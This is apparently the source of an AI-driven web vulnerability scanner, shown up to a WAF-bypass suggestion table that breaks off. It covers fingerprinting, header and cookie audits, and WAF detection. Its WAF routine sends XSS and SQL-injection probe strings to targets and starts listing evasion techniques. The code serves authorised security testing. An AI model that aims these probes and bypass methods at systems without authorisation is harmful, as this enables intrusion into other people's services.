"""
Falcon MAG - NIGHTFALL Core v2
Single-file autonomous VAPT engine.
Built from scratch using anthropic SDK (no ascii codec issues).
"""
from __future__ import annotations

import asyncio
import json
import os
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

import httpx
import structlog
from anthropic import AsyncAnthropic


# ============================================================
# Configuration
# ============================================================

BASE_DIR = Path(__file__).resolve().parent.parent.parent.parent.parent


@dataclass
class AIConfig:
    api_key: str = ""
    model: str = "deepseek-chat"
    base_url: str = "https://api.deepseek.com/v1"
    provider: str = "deepseek"  # deepseek | anthropic | openai
    max_tokens: int = 4096
    temperature: float = 0.1

    def __post_init__(self):
        # Auto-detect provider from env vars
        ds_key = os.environ.get("DEEPSEEK_API_KEY", "")
        anth_key = os.environ.get("MODEL_API_KEY", "")

        if ds_key:
            self.api_key = ds_key
            self.provider = "deepseek"
            self.base_url = "https://api.deepseek.com/v1"
            self.model = "deepseek-chat"
        elif anth_key and anth_key.startswith("sk-ant-"):
            self.api_key = anth_key
            self.provider = "anthropic"
            self.base_url = "https://api.anthropic.com/v1"
            self.model = "claude-haiku-4-5-20251001"
        elif anth_key:
            self.api_key = anth_key
            self.provider = "openai"
            self.base_url = "https://api.openai.com/v1"
            self.model = "gpt-4o-mini"


@dataclass
class ScanConfig:
    target: str = ""
    budget: int = 100
    exploit_mode: str = "off"  # off | confirm
    workers: int = 8
    rate_limit: float = 50.0
    timeout: float = 20.0
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Falcon-MAG/2.0"
    max_depth: int = 3
    max_pages: int = 100
    output_dir: str = "reports"
    db_path: str = str(Path(__file__).resolve().parent.parent.parent / "falcon.db")

    # === Protection layers (Stage 2.C, additive) ===
    cb_threshold: int = 3          # failures before circuit opens
    cb_cooldown: float = 30.0      # initial cooldown seconds
    cb_max_trip: float = 120.0     # max cooldown seconds
    max_retries: int = 2           # retry attempts for 5xx/timeout
    retry_backoff: float = 1.0     # base backoff (doubles each retry)


# ============================================================
# Logger (safe for Windows + subprocess)
# ============================================================

def setup_logger(name: str = "falcon", level: str = "INFO"):
    """Set up structlog with dual output: console + current_scan.log file."""
    import sys
    from pathlib import Path
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

    # Determine log file path (current_scan.log in backend dir)
    try:
        log_file = Path(__file__).resolve().parent.parent.parent / "current_scan.log"
        log_file.parent.mkdir(parents=True, exist_ok=True)
    except Exception:
        log_file = None

    def dual_logger_factory(*args, **kwargs):
        """Write to both console and file."""
        console_logger = structlog.PrintLoggerFactory()(*args, **kwargs)
        if log_file is None:
            return console_logger

        class DualLogger:
            def __init__(self, console, path):
                self.console = console
                self.path = path
            def msg(self, message):
                self.console.msg(message)
                try:
                    with open(self.path, "a", encoding="utf-8", errors="replace") as f:
                        f.write(message + "\n")
                except Exception:
                    pass
            def __getattr__(self, attr):
                return getattr(self.console, attr)
        return DualLogger(console_logger, log_file)

    structlog.configure(
        processors=[
            structlog.contextvars.merge_contextvars,
            structlog.processors.add_log_level,
            structlog.processors.TimeStamper(fmt="iso"),
            structlog.processors.JSONRenderer(ensure_ascii=False),
        ],
        wrapper_class=structlog.make_filtering_bound_logger(20),
        context_class=dict,
        logger_factory=dual_logger_factory,
        cache_logger_on_first_use=False,
    )
    return structlog.get_logger(name)


log = setup_logger()


# ============================================================
# AI Client (uses anthropic SDK - no encoding issues)
# ============================================================

class AIClient:
    """Async AI client supporting DeepSeek, Anthropic, and OpenAI-compatible APIs."""

    def __init__(self, config: AIConfig):
        self.config = config
        self.call_count = 0
        self.total_tokens = 0
        self.provider = getattr(config, "provider", "deepseek")
        self.base_url = getattr(config, "base_url", "https://api.deepseek.com/v1")

    async def think(
        self,
        system: str,
        prompt: str,
        max_tokens: Optional[int] = None,
        temperature: Optional[float] = None,
    ) -> dict:
        """Send reasoning request to the configured provider."""
        start = time.monotonic()
        try:
            if self.provider == "anthropic":
                result = await self._call_anthropic(system, prompt, max_tokens, temperature)
            else:
                # DeepSeek + OpenAI-compatible
                result = await self._call_openai_compat(system, prompt, max_tokens, temperature)

            elapsed = round(time.monotonic() - start, 2)
            self.call_count += 1
            log.info(
                "ai_think_complete",
                elapsed_s=elapsed,
                provider=self.provider,
            )
            return result
        except Exception as exc:
            elapsed = round(time.monotonic() - start, 2)
            log.error("ai_think_error", error=str(exc), elapsed_s=elapsed)
            return {"error": str(exc)}

    async def _call_openai_compat(self, system, prompt, max_tokens, temperature):
        """Call DeepSeek / OpenAI-compatible chat completions endpoint."""
        payload = {
            "model": self.config.model,
            "max_tokens": max_tokens or self.config.max_tokens,
            "temperature": temperature if temperature is not None else self.config.temperature,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": prompt},
            ],
        }
        headers = {
            "Authorization": f"Bearer {self.config.api_key}",
            "Content-Type": "application/json",
        }
        async with httpx.AsyncClient(timeout=180.0) as client:
            resp = await client.post(
                f"{self.base_url}/chat/completions",
                headers=headers,
                json=payload,
            )
            resp.raise_for_status()
            data = resp.json()

        text = data["choices"][0]["message"]["content"]
        usage = data.get("usage", {})
        self.total_tokens += (usage.get("prompt_tokens", 0) + usage.get("completion_tokens", 0))
        return self._parse_json(text)

    async def _call_anthropic(self, system, prompt, max_tokens, temperature):
        """Call Anthropic Messages API (legacy support)."""
        payload = {
            "model": self.config.model,
            "max_tokens": max_tokens or self.config.max_tokens,
            "system": system,
            "messages": [{"role": "user", "content": prompt}],
        }
        if temperature is not None:
            payload["temperature"] = temperature
        headers = {
            "x-api-key": self.config.api_key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json",
        }
        async with httpx.AsyncClient(timeout=180.0) as client:
            resp = await client.post(
                f"{self.base_url}/messages",
                headers=headers,
                json=payload,
            )
            resp.raise_for_status()
            data = resp.json()
        text = "".join(b.get("text", "") for b in data.get("content", []))
        usage = data.get("usage", {})
        self.total_tokens += (usage.get("input_tokens", 0) + usage.get("output_tokens", 0))
        return self._parse_json(text)

    @staticmethod
    def _parse_json(text: str) -> dict:
        """Extract JSON from AI response."""
        text = text.strip()
        # Direct parse
        try:
            return json.loads(text)
        except (json.JSONDecodeError, ValueError):
            pass
        # Strip markdown fences
        if "```json" in text:
            text = text.split("```json", 1)[1]
            if "```" in text:
                text = text.split("```", 1)[0]
            try:
                return json.loads(text.strip())
            except (json.JSONDecodeError, ValueError):
                pass
        # Find first { ... } block
        try:
            start = text.index("{")
            end = text.rindex("}") + 1
            return json.loads(text[start:end])
        except (ValueError, json.JSONDecodeError):
            pass
        return {"error": text[:2000]}


# ============================================================
# Test Entry Point
# ============================================================



# ============================================================
# Scope Guard
# ============================================================
from urllib.parse import urlparse

class ScopeGuard:
    def __init__(self, allowed_hosts, allow_private=False):
        self.allowed = set(h.lower().strip() for h in allowed_hosts if h)
        self.allow_private = allow_private
        self.denied = set()
    @classmethod
    def from_target(cls, target, allow_private=False):
        parsed = urlparse(target)
        host = (parsed.hostname or "").lower()
        return cls([host], allow_private=allow_private)
    def is_allowed(self, url):
        try:
            parsed = urlparse(url)
        except Exception:
            return False
        host = (parsed.hostname or "").lower()
        if not host:
            return False
        if host in self.denied:
            return False
        for allowed in self.allowed:
            if host == allowed or host.endswith("." + allowed):
                return True
        return False


class RateLimiter:
    def __init__(self, rate_per_sec=30.0, burst=5):
        self.rate = rate_per_sec
        self.burst = burst
        self._buckets = {}
        self._locks = {}
    async def acquire(self, host):
        if host not in self._locks:
            self._locks[host] = asyncio.Lock()
            self._buckets[host] = (float(self.burst), time.monotonic())
        async with self._locks[host]:
            tokens, last = self._buckets[host]
            now = time.monotonic()
            tokens = min(self.burst, tokens + (now - last) * self.rate)
            if tokens < 1:
                wait = (1 - tokens) / self.rate
                await asyncio.sleep(wait)
                tokens = 0
            else:
                tokens -= 1
            self._buckets[host] = (tokens, time.monotonic())



# === ADAPTIVE RATE + CIRCUIT BREAKER (v2) ===
# Added: 2026-09-21 — Stage 2.C
# Purpose: Prevent server DoS via adaptive throttling + circuit breaker + retry.
# Backward compatible: RateLimiter stays unchanged; these are optional layers.

class CircuitBreaker:
    """Trips open when target shows signs of stress (429/503/timeout).

    States:
      closed   → normal traffic
      half-open → slow traffic (testing recovery)
      open     → blocked for a cooldown period
    """

    def __init__(self, threshold=3, cooldown_sec=30.0, max_trip_sec=120.0):
        self.threshold = threshold          # failures before trip
        self.cooldown_sec = cooldown_sec    # initial cooldown
        self.max_trip_sec = max_trip_sec    # max cooldown
        self._state = {}                    # host -> "closed" | "open" | "half-open"
        self._failures = {}                 # host -> consecutive count
        self._opened_at = {}                # host -> monotonic timestamp
        self._trip_count = {}               # host -> how many times tripped

    def record_success(self, host):
        """Reset failure counter on success."""
        if not host:
            return
        self._failures[host] = 0
        if self._state.get(host) == "half-open":
            self._state[host] = "closed"

    def record_failure(self, host, kind="block"):
        """kind = 'block' (429/503) or 'timeout'."""
        if not host:
            return
        self._failures[host] = self._failures.get(host, 0) + 1
        if self._failures[host] >= self.threshold:
            self._state[host] = "open"
            self._opened_at[host] = time.monotonic()
            self._trip_count[host] = self._trip_count.get(host, 0) + 1

    def is_open(self, host):
        """Return True if we should skip requests to this host."""
        if not host:
            return False
        if self._state.get(host) != "open":
            return False
        # Check cooldown
        opened_at = self._opened_at.get(host, 0)
        elapsed = time.monotonic() - opened_at
        # Cooldown doubles on each trip, capped at max
        trips = self._trip_count.get(host, 1)
        cooldown = min(self.cooldown_sec * (2 ** (trips - 1)), self.max_trip_sec)
        if elapsed >= cooldown:
            self._state[host] = "half-open"
            self._failures[host] = 0
            return False
        return True

    def status(self, host):
        """Return diagnostic dict for a host."""
        return {
            "host": host,
            "state": self._state.get(host, "closed"),
            "failures": self._failures.get(host, 0),
            "trips": self._trip_count.get(host, 0),
        }


class AdaptiveRateLimiter(RateLimiter):
    """RateLimiter with dynamic rate adjustment based on server responses.

    Starts at `rate_per_sec`. Halves on 429/503. Slowly recovers on success.
    """

    def __init__(self, rate_per_sec=30.0, burst=5, min_rate=1.0):
        super().__init__(rate_per_sec=rate_per_sec, burst=burst)
        self.base_rate = rate_per_sec
        self.min_rate = min_rate
        self._current_rate = {}   # host -> current effective rate
        self._success_streak = {} # host -> consecutive successful requests

    def get_rate(self, host):
        return self._current_rate.get(host, self.base_rate)

    def on_block(self, host):
        """Halve the rate for this host (min = min_rate)."""
        if not host:
            return
        current = self._current_rate.get(host, self.base_rate)
        new_rate = max(current / 2.0, self.min_rate)
        self._current_rate[host] = new_rate
        self._success_streak[host] = 0

    def on_success(self, host):
        """Recover rate gradually after N consecutive successes."""
        if not host:
            return
        self._success_streak[host] = self._success_streak.get(host, 0) + 1
        # Every 10 successes, increase rate by 25% (up to base)
        if self._success_streak[host] >= 10:
            current = self._current_rate.get(host, self.base_rate)
            if current < self.base_rate:
                new_rate = min(current * 1.25, self.base_rate)
                self._current_rate[host] = new_rate
            self._success_streak[host] = 0

    async def acquire(self, host):
        """Uses dynamic rate for this host."""
        # Use dynamic rate in token refill
        if host in self._current_rate:
            old_rate = self.rate
            self.rate = self._current_rate[host]
            try:
                await super().acquire(host)
            finally:
                self.rate = old_rate
        else:
            await super().acquire(host)


# === END ADAPTIVE RATE + CIRCUIT BREAKER (v2) ===


@dataclass
class HttpResponse:
    url: str
    status: int
    headers: dict
    text: str
    elapsed_ms: float
    error: str = ""


class HttpPool:
    def __init__(self, scope, rate_limiter, config):
        self.scope = scope
        self.rate = rate_limiter
        self.config = config
        self.client = None
        self.request_count = 0

        # === Protection layers (additive, backward compatible) ===
        self.circuit_breaker = CircuitBreaker(
            threshold=getattr(config, "cb_threshold", 3),
            cooldown_sec=getattr(config, "cb_cooldown", 30.0),
            max_trip_sec=getattr(config, "cb_max_trip", 120.0),
        )
        self.adaptive = (
            self.rate if isinstance(self.rate, AdaptiveRateLimiter) else None
        )
        self.max_retries = getattr(config, "max_retries", 2)
        self.retry_backoff = getattr(config, "retry_backoff", 1.0)
        # Track retriable status codes
        self.retriable_status = {500, 502, 503, 504}
        # Track last error kind per host
        self._blocked_hosts = set()
        self._retry_count = 0  # stats
    async def __aenter__(self):
        self.client = httpx.AsyncClient(timeout=5.0, follow_redirects=True, verify=False, headers={"User-Agent": self.config.user_agent})
        return self
    async def __aexit__(self, *args):
        if self.client:
            await self.client.aclose()
    async def send(self, method, url, **kwargs):
        # ── 1. Scope & budget checks (as before) ─────────────
        if not self.scope.is_allowed(url):
            return HttpResponse(url=url, status=0, headers={}, text="", elapsed_ms=0.0, error="out of scope")
        if self.request_count >= self.config.budget:
            return HttpResponse(url=url, status=0, headers={}, text="", elapsed_ms=0.0, error="budget exhausted")

        parsed = urlparse(url)
        host = parsed.hostname or ""

        # ── 2. Circuit breaker (NEW — additive) ──────────────
        if self.circuit_breaker.is_open(host):
            return HttpResponse(
                url=url, status=0, headers={}, text="", elapsed_ms=0.0,
                error=f"circuit_open (host={host})"
            )

        # ── 3. Rate limit (as before) ────────────────────────
        await self.rate.acquire(host)

        # ── 4. Retry loop for transient errors (NEW) ─────────
        last_resp = None
        attempt = 0
        while attempt <= self.max_retries:
            start = time.monotonic()
            self.request_count += 1
            if attempt > 0:
                self._retry_count += 1

            try:
                resp = await self.client.request(method, url, **kwargs)
                elapsed = (time.monotonic() - start) * 1000
                status = resp.status_code

                # Retriable status → schedule retry
                if status in self.retriable_status and attempt < self.max_retries:
                    # record block on the adaptive limiter
                    if self.adaptive and status in (429, 503):
                        self.adaptive.on_block(host)
                    # wait before retry
                    await asyncio.sleep(self.retry_backoff * (2 ** attempt))
                    attempt += 1
                    last_resp = resp
                    continue

                # 429/503 → record block
                if status in (429, 503):
                    self.circuit_breaker.record_failure(host, kind="block")
                    if self.adaptive:
                        self.adaptive.on_block(host)
                else:
                    # Success → record success
                    self.circuit_breaker.record_success(host)
                    if self.adaptive:
                        self.adaptive.on_success(host)

                return HttpResponse(
                    url=str(resp.url), status=status,
                    headers=dict(resp.headers),
                    text=resp.text[:200000],
                    elapsed_ms=round(elapsed, 2),
                )

            except Exception as exc:
                elapsed = (time.monotonic() - start) * 1000
                is_timeout = "timeout" in str(exc).lower()
                if is_timeout:
                    self.circuit_breaker.record_failure(host, kind="timeout")

                if attempt < self.max_retries and is_timeout:
                    await asyncio.sleep(self.retry_backoff * (2 ** attempt))
                    attempt += 1
                    continue

                return HttpResponse(
                    url=url, status=0, headers={}, text="",
                    elapsed_ms=round(elapsed, 2), error=str(exc)
                )

        # All retries exhausted
        if last_resp is not None:
            return HttpResponse(
                url=str(last_resp.url), status=last_resp.status_code,
                headers=dict(last_resp.headers),
                text=last_resp.text[:200000], elapsed_ms=0.0,
                error="retries exhausted"
            )
        return HttpResponse(
            url=url, status=0, headers={}, text="", elapsed_ms=0.0,
            error="retries exhausted"
        )

    def protection_status(self):
        """Return diagnostic dict of protection layers."""
        return {
            "circuit_breaker": {
                "hosts_tracked": len(self.circuit_breaker._state),
                "hosts_open": sum(
                    1 for h in self.circuit_breaker._state
                    if self.circuit_breaker._state[h] == "open"
                ),
            },
            "adaptive": {
                "enabled": self.adaptive is not None,
                "hosts_throttled": len(self.adaptive._current_rate) if self.adaptive else 0,
            },
            "retries": {
                "total_retries": self._retry_count,
                "max_retries": self.max_retries,
            },
        }


async def test_fingerprint_advanced(pool, target):
    """Advanced fingerprinting: Server, Language, Framework, CMS,
    DB hints, JS libraries, security headers, cookies, WAF, meta tags."""
    import re as _re
    result = {
        "target": target, "server": "", "powered_by": "",
        "language": "", "framework": "", "cms": "",
        "js_libs": [], "db_hints": [], "security_headers": {},
        "missing_headers": [], "cookies": [], "waf": None,
        "meta_tags": {}, "technologies": [], "all_technologies": [],
    }
    resp = await pool.send("GET", target)
    if not resp or resp.status == 0:
        result["error"] = "unreachable"
        return result
    headers_lower = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
    body = (resp.text or "")
    body_lower = body.lower()

    # Server
    server_hdr = headers_lower.get("server", "")
    result["server"] = server_hdr
    sl = server_hdr.lower()
    if "apache" in sl: result["technologies"].append("Apache")
    if "nginx" in sl: result["technologies"].append("Nginx")
    if "iis" in sl: result["technologies"].append("IIS")
    if "litespeed" in sl: result["technologies"].append("LiteSpeed")
    if "caddy" in sl: result["technologies"].append("Caddy")
    if "gunicorn" in sl: result["technologies"].append("Gunicorn")
    if "uvicorn" in sl: result["technologies"].append("Uvicorn")

    # Powered-By
    pb = headers_lower.get("x-powered-by", "")
    result["powered_by"] = pb
    pbl = pb.lower()
    if "php" in pbl: result["language"] = "PHP"
    if "asp.net" in pbl: result["language"] = "ASP.NET"
    if "express" in pbl: result["framework"] = "Express"

    # WAF
    waf_hdrs = {
        "cf-ray": "Cloudflare",
        "x-akamai-transformed": "Akamai",
        "x-amz-cf-id": "AWS CloudFront",
        "x-sucuri-id": "Sucuri",
        "x-iinfo": "Imperva",
        "x-wa-info": "F5 BIG-IP",
    }
    for h, waf in waf_hdrs.items():
        if h in headers_lower:
            result["waf"] = waf
            result["technologies"].append(waf)
            break

    # CMS detection
    cms_patterns = {
        "WordPress": ["/wp-content/", "/wp-includes/", "wp-json"],
        "Joomla": ["/components/com_", "joomla"],
        "Drupal": ["drupalsettings", "/sites/default/files/", "drupal"],
        "Magento": ["mage/cookies", "/static/version", "magento"],
        "Shopify": ["cdn.shopify.com", "shopify"],
        "Wix": ["static.wixstatic.com", "wix.com"],
        "Squarespace": ["static1.squarespace.com", "squarespace"],
        "Ghost": ["ghost.org", "ghost-"],
    }
    for cms, patterns in cms_patterns.items():
        if any(p in body_lower for p in patterns):
            result["cms"] = cms
            result["technologies"].append(cms)
            break

    # Framework
    fw_patterns = {
        "Next.js": ["/_next/", "__next_data__"],
        "Nuxt": ["/_nuxt/", "__nuxt"],
        "React": ["react-dom", "_reactroot"],
        "Vue": ["vue.js", "vue.min.js", "data-v-"],
        "Angular": ["ng-version", "angular"],
        "Svelte": ["svelte-"],
        "Django": ["csrfmiddlewaretoken", "__admin_media_prefix__"],
        "Laravel": ["laravel_session", "xsrf-token"],
        "Rails": ["csrf-param", "rails-"],
        "Spring": ["jsessionid", "whitelabel error"],
    }
    for fw, patterns in fw_patterns.items():
        if any(p in body_lower for p in patterns):
            if not result["framework"]:
                result["framework"] = fw
            result["technologies"].append(fw)
            break

    # Language inference
    if not result["language"]:
        if "php" in body_lower or "phpsessid" in str(headers_lower):
            result["language"] = "PHP"
        elif "jsessionid" in str(headers_lower):
            result["language"] = "Java"
        elif "werkzeug" in sl or "python" in str(headers_lower):
            result["language"] = "Python"
        elif "asp.net" in str(headers_lower):
            result["language"] = "ASP.NET"
        elif "express" in str(headers_lower) or "node" in str(headers_lower):
            result["language"] = "Node.js"
    if result["language"]:
        result["technologies"].append(result["language"])

    # JS libraries
    js_libs_patterns = {
        "jQuery": ["jquery"],
        "React": ["react."],
        "Vue.js": ["vue."],
        "Angular": ["angular."],
        "Bootstrap": ["bootstrap."],
        "Tailwind": ["tailwind"],
        "Alpine.js": ["alpine"],
        "HTMX": ["htmx"],
        "Lodash": ["lodash"],
        "Moment.js": ["moment."],
    }
    for lib, patterns in js_libs_patterns.items():
        if any(p in body_lower for p in patterns):
            result["js_libs"].append(lib)
            result["technologies"].append(lib)

    # DB hints
    db_patterns = {
        "MySQL": ["mysql", "mysqli"],
        "PostgreSQL": ["postgresql", "pg_query", "sqlstate"],
        "MSSQL": ["microsoft sql server", "odbc sql server", "sqlserver"],
        "Oracle": ["oracle"],
        "MongoDB": ["mongodb", "mongo error", "bson"],
        "SQLite": ["sqlite"],
        "Redis": ["redis"],
    }
    for db, patterns in db_patterns.items():
        if any(p in body_lower for p in patterns):
            result["db_hints"].append(db)

    # Security headers
    security_headers = [
        "content-security-policy",
        "strict-transport-security",
        "x-frame-options",
        "x-content-type-options",
        "referrer-policy",
        "permissions-policy",
        "x-xss-protection",
    ]
    for h in security_headers:
        if h in headers_lower:
            result["security_headers"][h] = headers_lower[h][:200]
        else:
            result["missing_headers"].append(h)

    # Cookies
    raw_cookies = headers_lower.get("set-cookie", "")
    if raw_cookies:
        for chunk in _re.split(r",\s*(?=[A-Za-z0-9_\-]+=)", raw_cookies):
            name = chunk.split("=", 1)[0].strip() if "=" in chunk else ""
            if name:
                result["cookies"].append({
                    "name": name,
                    "secure": "secure" in chunk.lower(),
                    "httponly": "httponly" in chunk.lower(),
                    "samesite": ("samesite=" in chunk.lower()),
                })

    # Meta tags (safe regex)
    meta_re = _re.compile(r'<meta\s+[^>]*?name\s*=\s*["\x27]([^"\x27]+)["\x27][^>]*?content\s*=\s*["\x27]([^"\x27]*)["\x27]', _re.IGNORECASE)
    for match in meta_re.finditer(body):
        k = match.group(1).lower()
        v = match.group(2)[:200]
        if len(result["meta_tags"]) < 20:
            result["meta_tags"][k] = v

    # Dedupe technologies
    seen = set()
    unique_tech = []
    for t in result["technologies"]:
        if t and t not in seen:
            seen.add(t)
            unique_tech.append(t)
    result["technologies"] = unique_tech
    result["all_technologies"] = unique_tech

    log.info("fingerprint_advanced_complete",
             server=result["server"][:40],
             tech_count=len(unique_tech),
             waf=result["waf"])
    return result


async def test_security_headers(pool, target):
    """Detailed security headers analysis."""
    resp = await pool.send("GET", target)
    if not resp or resp.status == 0:
        return {"error": "unreachable", "target": target}
    hdrs = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
    SECURITY_HEADERS = {
        "content-security-policy": "high",
        "strict-transport-security": "high",
        "x-frame-options": "medium",
        "x-content-type-options": "medium",
        "referrer-policy": "low",
        "permissions-policy": "low",
        "x-xss-protection": "low",
        "cross-origin-opener-policy": "low",
        "cross-origin-embedder-policy": "low",
        "cross-origin-resource-policy": "low",
    }
    present = {}
    missing = []
    for h, sev in SECURITY_HEADERS.items():
        if h in hdrs:
            present[h] = hdrs[h][:300]
        else:
            missing.append({"header": h, "severity": sev})
    findings = []
    for item in missing:
        findings.append({
            "vuln_class": "security_headers",
            "subtype": "missing_header",
            "severity": item["severity"],
            "url": target,
            "param": item["header"],
            "payload": "",
            "evidence": f"Missing: {item['header']}",
            "confidence": 0.9,
        })
    log.info("security_headers_complete",
             present=len(present), missing=len(missing))
    return {
        "target": target,
        "present": present,
        "missing": missing,
        "findings": findings,
        "vulnerable": findings,
    }


async def test_cookies_advanced(pool, target):
    """Detailed cookie security analysis."""
    import re as _re
    resp = await pool.send("GET", target)
    if not resp or resp.status == 0:
        return {"error": "unreachable", "target": target}
    hdrs = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
    raw = hdrs.get("set-cookie", "")
    cookies = []
    findings = []
    if not raw:
        return {"target": target, "cookies": [], "vulnerable": []}
    SESSION_HINTS = ("session", "sess", "sid", "auth", "token", "jwt",
                     "login", "user", "csrf", "remember")
    for chunk in _re.split(r",\s*(?=[A-Za-z0-9_\-]+=)", raw):
        if "=" not in chunk:
            continue
        name = chunk.split("=", 1)[0].strip()
        if not name:
            continue
        lower = chunk.lower()
        info = {
            "name": name,
            "secure": "secure" in lower,
            "httponly": "httponly" in lower,
            "samesite": None,
        }
        m = _re.search(r"samesite=(\w+)", lower)
        if m:
            info["samesite"] = m.group(1)
        cookies.append(info)
        missing = []
        if not info["secure"]:
            missing.append("Secure")
        if not info["httponly"]:
            missing.append("HttpOnly")
        if not info["samesite"]:
            missing.append("SameSite")
        if not missing:
            continue
        name_lower = name.lower()
        is_session = any(h in name_lower for h in SESSION_HINTS)
        sev = "medium" if is_session else "low"
        if "Secure" in missing and "HttpOnly" in missing and is_session:
            sev = "high"
        findings.append({
            "vuln_class": "cookies",
            "subtype": "insecure_cookie",
            "severity": sev,
            "url": target,
            "param": name,
            "payload": "",
            "evidence": f"Cookie '{name}' missing: {', '.join(missing)}",
            "confidence": 0.9,
        })
    log.info("cookies_advanced_complete", total=len(cookies), insecure=len(findings))
    return {
        "target": target,
        "cookies": cookies,
        "findings": findings,
        "vulnerable": findings,
    }


# ============================================================
# WAF ADVANCED DETECTION (Stage 2.B8-WAF)
# ============================================================
# 30+ WAF signatures, active probing, strictness analysis,
# bypass suggestions. Coexists with legacy detect_waf().

WAF_SIGNATURES = [
    # (Name, header_keys_lower, server_keywords_lower, cookie_prefixes)
    ("Cloudflare", ["cf-ray", "cf-cache-status", "cf-request-id"], ["cloudflare"], ["__cf_bm", "__cfduid", "cf_clearance"]),
    ("AWS WAF", ["x-amzn-requestid", "x-amz-cf-id", "x-amz-apigw-id"], ["awselb", "aws-waf"], []),
    ("AWS CloudFront", ["x-amz-cf-pop", "x-amz-cf-id"], ["cloudfront"], []),
    ("Akamai", ["x-akamai-transformed", "akamai-grn", "x-akamai-request-id"], ["akamaighost", "akamai"], []),
    ("Sucuri", ["x-sucuri-id", "x-sucuri-cache", "x-sucuri-block"], ["sucuri"], ["sucuri_cloudproxy"]),
    ("Imperva", ["x-iinfo", "x-cdn"], ["incapsula", "imperva"], ["incap_ses", "visid_incap"]),
    ("F5 BIG-IP", ["x-wa-info", "x-cnection"], ["bigipserver", "f5", "big-ip"], ["bigipserver", "ts", "f5_cspm"]),
    ("Barracuda", ["barra_counter_session"], ["barracuda"], ["barra_counter_session", "barra_session"]),
    ("ModSecurity", [], ["mod_security", "modsecurity", "noModSecurity"], []),
    ("Wordfence", ["x-wordfence"], ["wordfence"], ["wfvt_", "wordfence_verifiedHuman"]),
    ("Fortinet", [], ["fortiweb", "fortigate"], ["FORTIWAFSID"]),
    ("Citrix NetScaler", ["x-ns-cache"], ["netscaler", "citrix", "ns-cache"], ["citrix_ns_id", "NSC_"]),
    ("Fastly", ["x-served-by", "x-fastly-request-id", "fastly-debug-digest"], ["fastly", "varnish"], []),
    ("Varnish", ["x-varnish", "via"], ["varnish"], []),
    ("StackPath", ["x-sp-cache"], ["stackpath"], []),
    ("KeyCDN", ["x-cache"], ["keycdn"], []),
    ("Radware", [], ["radware", "appwall"], ["rdwr"]),
    ("Wallarm", ["x-wallarm-waf", "server: nginx-wallarm"], ["wallarm"], []),
    ("DenyAll", [], ["denyall"], ["sessioncookie"]),
    ("Reblaze", ["rbzid"], ["reblaze"], []),
    ("Distil", [], ["distil"], []),
    ("Juniper", [], ["juniper", "junos"], []),
    ("NGINX Plus", [], ["nginx-plus"], []),
    ("Cloudflare Bot Mgmt", ["cf-mitigated"], [], ["cf_chl_"]),
    ("Alibaba Cloud WAF", ["ali-cdn-real-ip", "eagleeye-traceid"], ["tengine", "alibaba"], []),
    ("Tencent Cloud WAF", ["x-nws-log-uuid"], ["tencent"], []),
    ("Huawei Cloud WAF", [], ["hw-waf", "huawei"], []),
    ("360 WAF", [], ["360wzws", "wangzhan"], ["wzws_sessionid"]),
    ("SafeDog", [], ["safedog"], ["safedog-flow-item"]),
    ("Yunsuo", [], ["yunsuo"], ["yunsuo_session"]),
    ("DDoS-GUARD", [], ["ddos-guard"], ["__ddg"]),
    ("Comodo", [], ["comodo", "cwatch"], []),
    ("Google Cloud Armor", ["x-cloud-trace-context"], ["google", "gfe"], []),
]


def _waf_match_by_headers(headers_lower, cookies_str):
    """Passive match: look for known WAF signatures in headers + cookies."""
    matches = []
    server = headers_lower.get("server", "").lower()
    via = headers_lower.get("via", "").lower()
    for name, header_keys, server_keys, cookie_prefixes in WAF_SIGNATURES:
        signals = []
        for hk in header_keys:
            if hk in headers_lower:
                signals.append(f"header:{hk}")
        for sk in server_keys:
            if sk in server or sk in via:
                signals.append(f"server:{sk}")
        for cp in cookie_prefixes:
            if cp.lower() in cookies_str.lower():
                signals.append(f"cookie:{cp}")
        if signals:
            matches.append({"name": name, "signals": signals})
    return matches


async def test_waf_advanced(pool, target, active_probe=True):
    """Comprehensive WAF detection + fingerprinting + strictness analysis.

    Args:
        pool: HttpPool
        target: URL
        active_probe: send test payloads (uses ~6 requests)

    Returns: rich dict with waf, strictness, bypass_suggestions, etc.
    """
    result = {
        "target": target,
        "detected": False,
        "waf": None,
        "all_candidates": [],
        "signals": [],
        "strictness": None,
        "blocked_status": None,
        "bypass_suggestions": [],
        "server_header": "",
        "probes_sent": 0,
    }

    # ── 1. Passive detection ─────────────────────────────
    resp = await pool.send("GET", target)
    if not resp or resp.status == 0:
        result["error"] = "unreachable"
        return result

    headers_lower = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
    result["server_header"] = headers_lower.get("server", "")
    cookies_str = headers_lower.get("set-cookie", "")

    candidates = _waf_match_by_headers(headers_lower, cookies_str)
    result["all_candidates"] = candidates

    if candidates:
        result["detected"] = True
        result["waf"] = candidates[0]["name"]
        result["signals"] = candidates[0]["signals"]

    # ── 2. Active probing (optional) ─────────────────────
    if active_probe and not result["detected"]:
        # Send a harmless XSS payload and see if it's blocked
        test_url = target.rstrip("/") + "/?waf_probe=<script>alert(1)</script>"
        try:
            probe = await pool.send("GET", test_url)
            result["probes_sent"] += 1
            if probe and probe.status in (403, 406, 419, 501, 503):
                result["detected"] = True
                result["blocked_status"] = probe.status
                result["strictness"] = "high"
                result["signals"].append(f"active:HTTP{probe.status}")
        except Exception:
            pass

        # Try SQL quote
        test_url2 = target.rstrip("/") + "/?waf_probe=1'+OR+'1'='1"
        try:
            probe2 = await pool.send("GET", test_url2)
            result["probes_sent"] += 1
            if probe2 and probe2.status in (403, 406, 419):
                result["detected"] = True
                if not result["blocked_status"]:
                    result["blocked_status"] = probe2.status
                if result["strictness"] != "high":
                    result["strictness"] = "medium"
        except Exception:
            pass

    # ── 3. Infer strictness from detection ───────────────
    if result["detected"] and not result["strictness"]:
        if result["blocked_status"]:
            result["strictness"] = "medium"
        else:
            result["strictness"] = "low"

    # ── 4. Bypass suggestions ────────────────────────────
    waf_name = result["waf"] or "unknown"
    suggestions = {
        "Cloudflare": ["Mixed case payloads", "Double URL encoding", "Unicode escapes",
